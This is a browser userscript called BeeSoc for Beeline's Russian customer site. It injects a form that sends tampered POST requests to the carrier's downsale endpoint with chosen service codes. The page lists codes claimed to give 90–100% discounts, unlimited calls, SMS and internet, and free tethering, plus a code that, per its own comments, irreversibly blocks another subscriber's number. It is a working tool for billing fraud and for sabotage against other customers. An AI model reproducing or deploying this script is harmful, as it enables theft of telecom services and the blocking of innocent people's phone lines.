// ==UserScript==
// @name        BeeSoc
// @namespace   BeeSoc
// @name:ru     BeeSoc
// @description:ru     Инструмент для Beeline
// @description:en     Tool for Beeline
// @include     https://*.beeline.ru/*
// @version     1.3|0.5
// @grant       none
// @author      Telegra|Lar
// @description Инструмент для Beeline
// @downloadURL https://update.greasyfork.org/scripts/396984/BeeSoc.user.js
// @updateURL https://update.greasyfork.org/scripts/396984/BeeSoc.meta.js
// ==/UserScript==
$('body').prepend(`
<style>
.zTool {
margin: 10px;
}
.zTool * {
margin: 5px;
}
.zTool pre {
    white-space: pre-wrap;
    word-wrap: break-word;}
</style>
`);
if (~$('body').text().indexOf('Войдите, чтобы получить доступ к вашим персональным данным.')) {
$('body').prepend(`<div class="zTool"><b>Авторизируйтесь для пользования инструментом!</b></div>`);
} else {
$('body').prepend(`
<div class="zTool">
<hr>
<section id="blockOff">
Адрес: <input id="URLz" class="URIoff" size="100%" type="text">
<hr>
<table id="dataoff">
	<tbody>
		<tr>
			<td>Имя:</td>
			<td>Значение:</td>
		</tr>
		<tr class="get">
			<td><input type="text" value="downsellOfferType" size="30"></td>
			<td><input type="text" value="Discount" size="50"></td>
		</tr>
		<tr class="get">
			<td><input type="text" value="serviceSoc" size="30"></td>
			<td><input type="text" value="12TMDIS90" size="50"></td>
		</tr>
	</tbody>
</table>
<hr>
<ul>
<table>
	<tr>
			<td>
				<b>Скидка</b><br>
				12TMDIS90 - 90% на год<br>
				<br>
				1TMDISC00 - 100% на 1 год<br>
			</td>
			<td>
				<b>Звонки/СМС/Интернет</b><br>
				CVMMGVSR - 5000 минут на междугород<br>
				SMSUNLRF0 - Безлимитные СМС<br>
				UNL_PRES - Безлимитный интернет<br>
				TM_TETR0 - Раздача WiFi халявно<br>
				4G_PRO182 - Безлимит в 4G-5 лет.<br>
			</td>
			<td>
			</td>
			<td>
				<b>Бан абонента</b><br>
				TMBON_130 - ( В СОКЕ ПИШЕМ ДОПОЛНИТЕЛЬНО НОМЕР )<br>
				РАБОТАЕТ ЧЕРЕЗ РАЗ <br>
				!!!ВНИМАНИЕ!!! <br>
				ПРИ БЛОКИРОВКИ АБОНЕНТА <br>
				РАЗБАН НЕВОЗМОЖЕН <br>
			</td>
			<td>
				<b>МОЙ ТЕЛЕГРАММ </b><br>
				<b>ПО ВСЕМ ВОПРОСАМ ОБНОВЛЕНИЙ И ВСЯКОЙ БИЛИБЕРДЫ</b><br>
				<b>T.ME/PARASHA13</b><br>
			</td>
		</tr>
	</table>
</ul>
<hr>
<button onclick="send('off')">GO</button>
</section>
<hr>
<span style="display: none" id="zLoading">Отправляем запрос...</span>
<b id="zOtvetText" style="display:none">Ответ:</b>
<pre id="zOtvet"></pre>
<script>
function send(type) {
var data = [];
$('#data'+type+' tbody tr.get').each(function() {
data[$(this).find('td:nth-child(1) input').val()] = $(this).find('td:nth-child(2) input').val();
});
data = Object.assign({}, data);
$('#zLoading').show();
$('#zOtvetText').hide();
$('#zOtvet').hide();
$.ajax({
	          url: $('.URI'+type).val(),
	          type: 'POST',
	          contentType: "application/json;charset=UTF-8",
	          data: JSON.stringify(data),
complete: function(jqXHR, textStatus) {
    switch (jqXHR.status) {
        case 200:
$('#zLoading').hide();
$('#zOtvetText').show();
$('#zOtvet').show().html(JSON.stringify(jqXHR));
        break;
        default:
$('#zLoading').hide();
$('#zOtvetText').show();
$('#zOtvet').show().html('Готово! Проверяйте :)');
    }
}
	    });
}
</script>
</div>
`);
document.getElementById('URLz').value = "https://"+document.domain+"/mobiledownsale/upsaleconnect";
}